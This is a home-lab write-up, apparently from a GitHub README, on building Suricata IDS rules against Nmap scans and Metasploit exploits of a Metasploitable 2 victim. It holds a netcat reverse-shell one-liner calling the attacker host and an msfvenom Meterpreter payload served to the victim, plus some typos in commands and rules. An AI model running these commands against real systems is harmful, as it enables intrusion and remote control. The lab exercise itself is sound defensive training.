# Suricata Lab

## Overview

An intrusion detection system (IDS) is a security control implemented to accurately identify and alert security teams of unauthorised access, malicious activities or policy violations on a network or system. Suricata is an open-source IDS that can detect threats by comparing network traffic against its database of known attack signatures. In this project, I set up a virtualized home lab inspired by and under the guidance of [this repo](https://github.com/0xrajneesh/Suricata-IDS-Home-Lab) to deploy and test Suricata IDS against simulated cyber attacks. By configuring Suricata on an Ubuntu virtual machine (VM), a victim VM (Metasploitable 2), a Kali Linux VM equipped with penetration testing tools (Tcpdump, Nmap and Metasploit Framework), this lab provided a controlled environment to develop and refine Suricata detection rules.

## Network Diagram

<p align="center">
  <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/suricata-lab-diagram.png?raw=true" width="60%"/>
</p>

## Environment Setup

### System Specification

The lab was set up using 2 physical computers. The first hosted the defended network of 2 VMs and the other hosted 1 VM for attack simulation. The defended network VMs ran on a Windows 11 machine using 16GB RAM and 500GB storage. The attacker VM ran on Ubuntu 22.04 machine using 8GB RAM and 500GB storage. VMs were hosted using Oracle VirtualBox on both physical machines.

The following VM provisions were made for the defended network on VirtualBox:
<br>

| Machine Function | RAM (GB) | Processors | Storage (GB) |
|---------- |----------|----------|----------|
| Suricata Ubuntu Server 22.04 | 4 | 3 | 30 |
| Metasploitable 2 | 4 | 3 | 8 |

Unlike the previous 2 VMs which were setup using disk images, the attacker VM was setup using a .vbox file acquired from [the Kali website](http://www.kali.org). As such, a 80GB preset storage was provisioned along with 4GB RAM and 4 CPU cores. The choice of a .vbox setup was so that Kali could be used out the box. In addition, the Suricata server, under Settings > Network > Advanced > Promiscuous Mode was set to Allow All to support the use of a network analyser for rule creation.

### Attacker Machine - Kali Linux

Once the system was booted, the user logged in and an internet connection was established, a package update and upgrade was performed:<br>
```sudo apt-get update && sudo apt-get upgrade -y ```<br>

In addition, the system was checked for the required tools (Nmap and Metasploit Framework) which came pre-installed.

### Suricata IDS - Ubuntu Server 22.04

After resource provisioning in VirtualBox and the initial boot, a package update and upgrade was performed. Suricata was then installed using:<br>
```sudo apt-get install suricata -y```<br>

Upon completion, the installation was confirmed using:<br>
```apt list | grep suricata```<br>

It was then verified that the Suricata service was up and running using:<br>
```sudo systemctl status suricata```<br>

The Suricata /etc/suricata/suricata.yaml file was then configured as follows:
- Defined the HOME_NET variable based all devices on this defended network.
- Set EXTERNAL_NET to "!$HOME_NET".
- Specified the rule location as /etc/suricata/rules/custom.rules (and later created the file).
- Set the packet capture interface to that of my local machine.
- Saved and closed the configuration file.
- To test that Suricata could monitor network traffic, the following rule was added to the custom.rules file to detect simple pings:<br>
```alert icmp any any -> $HOME_NET any (msg:"Ping Test detected"; sid: 1000000; rev:1;)```
- After saving the rule file, Suricata was restarted using:<br>
```sudo systemctl restart suricata```
- To ensure that the configuration worked, the Suricata log file was checked using:<br>
```cat /var/log/suricata.suricata.log```
- Successful configuration was verified from:
  - MTU being found for the specified network interface
  - All default log files being initialised
  - The rule being processed with the 1 rule in it being successfully loaded
  - All AFP capture threads running.
- To test the rule, a ping test was initiated from the attacker machine to this machine's IP address. I then searched for the alert message for the rule in /var/log/suricata/eve.json on the Suricata server.

Next, jq (a JSON processor used for seamless reading of the eve.json log file) was installed using:<br>
```sudo apt-get install jq -y```<br>

Once complete, the download was confirmed using:<br>
```jq --version```<br>

Finally, tcpdump was installed using:<br>
```sudo apt-get install tcpdump -y```<br>

The download was then confirmed using:<br>
```apt list | grep tcpdump```<br>

Tcpdump would later be used to derive rules from conversations between the attacker and victim.

### Metasploitable 2

The system was configured, booted and logged into. Given that Metasploitable 2 is a legacy system, packages were not updated/upgraded. An Nmap scan was then executed from the attacker machine to confirm that the services on the system were visible.

## Methodology - Attacking and Detecting:

To monitor the communication between the attacker and the victim for each attack, tcpdump was initiated on the Suricata server using this command:<br>
```sudo tcpdump -i <interface> -vvv -nn "host 192.168.134 > foo.txt```<br>
Thereafter, an attack was launched and once completed, the packet analysis was stopped and the contents examined for patterns that could address each challenge.

### Stealth Scan

A stealth scan using Nmap, such as a SYN scan, sends SYN packets to a target without completing the TCP handshake, making it harder to detect in logs compared to a full connection scan. This attack can be used to silently probe for open ports and vulnerabilities, potentially leading to targeted exploits or network intrusions.

Challenge: _Create a Suricata rule to detect TCP SYN packets sent to multiple ports within a short time frame, indicative of Nmap stealth scans._

On the attacker, the nmap scan command below was used and result of the scan was:<br>
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/service-version-scan.png?raw=true">
The rule crafted from the packets captured was:<br>
```
alert tcp any any -> $HOME_NET any (msg: "Possible Nmap stealth scan detected"; flag: S; window: 1024; threshold: typ both, track_by_src, count 5, seconds 10, sid: 1000001; rev:1;)
```
This rule alerts on TCP packets, with the SYN flag set, for any port in $HOME_NET. It specifically triggers when a single source sends 5 or more SYN packets within 10 seconds.<br>

### OS Fingerprinting Scan

An OS fingerprinting scan using Nmap analyzes subtle differences in network responses (such as TCP/IP stack behavior) to determine the target system's operating system and version. Attackers can use this information to tailor exploits specifically for the detected OS, increasing the chances of a successful attack.

Challenge: _Develop a Suricata rule to detect ICMP echo requests and responses with specific TTL values, characteristic of Nmap OS fingerprinting activities._

On the attacker, the nmap scan command below was used and result of the scan was:<br>
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/os-fingerprint-scan.png?raw=true">
The rules crafted from the packets captured were:<br>
```
alert icmp any any -> $HOME_NET any (msg: "ECHO ICMP request detected"; ttl:>45; ttl:<60; sid: 1000002; rev:1;)
alert icmp $HOME_NET any -> any any (msg: "ECHO ICMP response detected"; ttl: 64; sid: 1000003; rev:1;)
```
The first rule alerts on ICMP Echo Request packets sent to $HOME_NET with a TTL between 46 and 5,9 which may help detect operating system specific fingerprinting attempts or unusual ping behavior. The second rule alerts on responses sent with TTL values of 64 (characteristic of Linux-based operating systems).<br>

### Service Version Scan

A service version scan using Nmap probes open ports to identify running services and their versions by analyzing responses to crafted queries. Attackers can use the gathered information to exploit known vulnerabilities in outdated or misconfigured services, leading to potential system compromise.

Challenge: _Formulate a Suricata rule to detect Nmap service version detection probes based on unique HTTP GET requests or TCP SYN/ACK packets._

On the attacker, the nmap scan command below was used and result of the scan was:<br>
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/stealth-scan.png?raw=true">
The rule crafted from the packets captured was:<br>
```
alert tcp any any -> $HOME_NET any (msg: "Nmap service version scan detected"; flow:established, to_server; content: "nmap"; http_header; sid: 1000004; rev:1;)
```
This rule looks for the string "nmap" in the HTTP headers of TCP traffic going to $HOME_NET when the connection is established and directed to a server.<br>

### Metasploit Exploit Payload - Unreal IRC 3281 (add user payload)

The Metasploit Unreal IRCd 3.2.8.1 Backdoor Exploit targets a backdoor in UnrealIRCd 3.2.8.1, allowing remote attackers to execute arbitrary system commands by sending specially crafted data to the IRC server. In a real-world scenario, this vulnerability can lead to full remote control of the server, enabling attackers to steal data, deploy malware, or use the compromised server as a launchpad for further attacks. In this simulated attack, a new user is added to the target system - a common tactic for maintaining persistent access after exploitation.

Challenge: _Craft a Suricata rule to detect Metasploit exploit payload traffic based on unique signatures or payloads commonly used in exploits._

Metasploit Framework was launched using ```msfconsole``` from the terminal on the attacker. Using the service versions obtained earlier, an exploit for the Unreal IRC module was found and run using the following sequence of commands:<br>
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-search.png?raw=true">
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-settings.png?raw=true">

The following was run on the victim to confirm the newly added user:<br>
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-user-added.png?raw=true"><br>

The rule crafted from the packets captured was:<br>
```
alert tcp any any -> $HOME_NET 6667 (msg: "Metasploit Unreal IRC 3821 add user payload detected"; content: "echo"; pcre: "/echo.*\/etc\/(passwd|sudoers)/"; sid: 1000005; rev:1;)
```
This rule detects attempts to add a user by executing an echo command to modify /etc/passwd or /etc/sudoers. It looks for the keyword "echo" and uses a PCRE pattern to match commands writing to these files on TCP port 6667 (IRC).

### Metasploit Reverse Shell - Leveraging the VSFTPD 2.3.4 vulnerability

A Metasploit reverse shell enables an attacker to execute commands on a compromised system by having the target initiate an outbound connection to the attacker's machine, effectively bypassing firewalls and NAT restrictions. A vulnerability like vsftpd 2.3.4 can be exploited by injecting a backdoor, which spawns an interactive shell with elevated privileges, and used to create a more stable shell initiated from the victim. This reverse connection grants the attacker full control over the system, with little risk of detection, as outbound connections are typically trusted by firewalls and other security defenses.

Challenge: _Develop a Suricata rule to detect Metasploit reverse shell connections by monitoring for outbound TCP connections to known attacker IP addresses._

Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found and run using the following sequence of commands:<br>
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-search.png?raw=true)">
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-settings.png?raw=true">

Note that once the vulnerability was exploited and a bind shell was spawned, the attacker ran ```whoami``` and ```uname -a``` to confirm access to the victim (since no prompt was displayed). To set up a reverse shell, the following command was executed using a separate terminal session on the attacker:<br>
```nc -lvnp 17000 ```<br>

This command listened for connections on port 17000. Thereafter, in the spawned shell, the following was executed to connect another shell session to the attacker:<br>
```nc -e /bin/bash 192.168.8.134 17000```<br>
Below are the commands used to listen for this reverse shell connection and some commands to setup better utility of the shell (typical when improving the quality of the shell to allow easier use):
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/attacker-reverse-shell.png?raw=true">

The rule crafted from the packets captured was:<br>
```
alert tcp $HOME_NET any -> any 17000 (msg:"Possible reverse shell on port 17000"; flow: established, to_server; sid: 1000006; rev: 1;)
```
This rule alerts when an internal host, such as the Metasploitable victim, establishes an outbound TCP connection to port 17000 on any external system. It specifically looks for an established connection where traffic is flowing to the server, which may indicate a reverse shell or other suspicious activity.

### Metasploit Meterpreter Communication - Upgrading the VSFTPD 2.3.4 shell

Meterpreter is a powerful, dynamic payload within Metasploit with brief command syntax that offers high-level functionality. This can streamline attacks and enhance ease of use by allowing attackers to efficiently perform tasks like system exploration, privilege escalation, and persistence. A vulnerability like vsftpd 2.3.4 can be exploited to inject a backdoor that opens a bind shell, which the attacker can then connect to and upgrade to a Meterpreter session for more robust control, including stealthy operations and evasion of detection. The risks of such an attack include data theft, further compromise, and long-term control of the targeted system.

Challenge: _Create a Suricata rule to detect Meterpreter communication activities by analyzing HTTP or TCP traffic with characteristic Meterpreter payloads._

Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found and run using the following sequence of commands:<br>
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-search.png?raw=true)">
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-settings.png?raw=true">

Having spawned the bind shell from this exploit, the Meterpreter payload was generated using msfvenom in a separate terminal session:<br>
```msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.8.134 LPORT=87 -f elf > meter.elf```<br>

The attacker then hosted the payload on a Python web server in yet another separate terminal session:<br>
```python3 -m http.server 8080```<br>

The attacker then downloaded the payload on the victim machine via the bind shell, set the executable permissions, navigated to the payload's folder and then checked the permisions on the file. Finally, the bind shell session was then put into the background by typing the "background" command and choosing "y" when prompted:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/meterpreter-download-setup.png">

From there, a Meterpreter listener was then set up using the following sequence:

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/listener-setup-and-connect.png">

Note that the payload, LHOST and LPORT values were specifically set to match those used to create the meterpreter payload. The exploit was done with the -j switch to run it in the background. The bind shell session number was then confirmed and brought to the foreground. The Meterpreter payload was then executed in the background. Once Metasploit notified that a Meterpreter session was created, the bind shell was again put into the background and the session switched to Meterpreter's using:<br>
```sessions -i 2```<br>

The appearance of the Meterpreter shell prompt validated the success of the exploit. The system information from ```sysinfo``` and the IP address from ```ifconfig``` were used to confirm the system under control:

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/meterpreter-system-confirmation.png">

Since the victim was made to download an ELF payload, the Suricata rule was crafted with this in mind:
```
alert tcp any any -> $HOME_NET any (msg:"ELF file transfer detected"; flow:to_client, established; content:"|7F 45 4C 46|"; offset:0; depth:4; sid:1000008; rev:1;)
```

This rule flags outbound payload transfers where the payload's header starts with the ELF magic number (0x7F 45 4C 46), indicating an ELF file transfer.

## Evaluating and Improving Detection:

- Analyze Suricata logs to validate detections and refine rules.
- Review false positives/negatives and adjust rule sensitivity.
- Document findings and potential improvements to enhance Suricata’s detection capabilities.

## Lessons Learned & Improvements:

- Insights gained from the setup and attacks.
- Possible enhancements:
    - Executing more attack types for exposure to more attack vectors.
    - Forwarding logs to a SIEM to exercise other SOC analyst skills.
